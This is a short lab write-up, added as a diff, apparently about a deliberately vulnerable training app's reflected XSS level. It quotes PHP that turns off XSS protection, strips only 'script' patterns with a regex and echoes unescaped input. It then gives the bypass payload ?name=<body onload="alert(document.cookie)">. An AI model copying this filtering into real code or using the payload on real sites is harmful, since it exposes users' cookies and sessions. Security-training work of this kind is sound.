@@ -1,0 +1,23 @@
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?> 
+
+
+The source code above shows that the pattern "<s*c*r*i*p*t" is not allowed. but like in the
+previous level we don't use tags. so that we can still use the same payload as in the previous level. <script>
+
+perform attack:
+
+
+?name=<body onload="alert(document.cookie)">
